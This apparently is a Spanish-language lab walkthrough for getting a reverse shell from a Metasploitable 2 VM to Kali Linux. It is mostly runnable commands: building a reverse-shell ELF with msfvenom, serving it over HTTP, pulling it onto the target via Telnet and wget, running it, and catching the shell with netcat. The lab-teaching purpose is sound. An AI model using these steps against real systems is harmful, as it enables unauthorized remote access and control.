# Shell Inversa con Telnet
Obtener una shell remota desde una máquina vulnerable (Metasploitable 2) hacia Kali Linux usando un binario malicioso (shell.elf) creado con msfvenom, subido por Telnet, y ejecutado para generar una conexión inversa con Netcat.

## 1. CREAR EL PAYLOAD

Usamos msfvenom para generar un payload tipo ELF (Linux) que abre una shell inversa hacia Kali en el puerto 4444.

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.171.132 LPORT=4444 -f elf -o shell.elf
```
![image](https://github.com/user-attachments/assets/9832a339-55b6-4310-a799-575a489c714f)

## 2. Servir el archivo en Kali

Se usa un servidor HTTP simple en Python para que Metasploitable pueda descargar el binario.

```bash
python3 -m http.server 8000
```

Esto hace levantar un servidor HTTP local en el puerto 8000 para servir archivos desde el directorio actual (donde está shell.elf).

![image](https://github.com/user-attachments/assets/d3a87a2d-e7e3-46dc-8f60-e940c0e36e04)

## 3. Escuchar con Netcat en Kali

Antes de ejecutar el binario en la víctima, nos preparamos para recibir la conexión con netcat:

```bash
nc -nlvp 4444
```

![image](https://github.com/user-attachments/assets/d231de41-07df-437a-b4c8-4a1f7919d6c5)

## 4. Descargar shell.elf en Metasploitable (vía Telnet)
# 4.1. Entra a Metasploitable por Telnet

```bash
telnet 192.168.171.133
```
Nos conectamos a Metasploitable, luego usamos wget para descargar el archivo desde el servidor de Kali.

![image](https://github.com/user-attachments/assets/4a34a147-b844-428b-bfac-64a488fd6e9e)

# 4.2. Descargamos shell.elf desde el servidor web de Kali

```bash
cd /tmp
wget http://192.168.171.132:8000/shell.elf

```
![Captura de pantalla 2025-05-28 115712](https://github.com/user-attachments/assets/00f004b2-19bb-4dd7-91fa-e724f75e79a9)


## 5. Dar permisos y ejecutar

Concedemos permisos de ejecución al binario y lo ejecutamos:

```bash
chmod +x shell.elf
./shell.elf
```
![image](https://github.com/user-attachments/assets/7a6e6478-d61d-4094-9816-d0c1aae34d57)


## 6. Shell obtenida

En la terminal donde estaba el  nc -nlvp 4444, se vera:

```bash
connect to [192.168.171.132] from (192.168.171.133) 12345
```

![image](https://github.com/user-attachments/assets/2f80a495-b6de-4ca9-885c-26346b23253f)

Y en la terminal de Kali (como se ve en la imagen), se registró la solicitud:

![image](https://github.com/user-attachments/assets/1cd50a84-0176-4700-b3fc-c9dbc7494f42)


por lo tanto ya se puede ejecutar comandos como si estuvieras dentro de la máquina Metasploitable:

![image](https://github.com/user-attachments/assets/711374e0-97ac-4824-be44-297071d7ce8d)
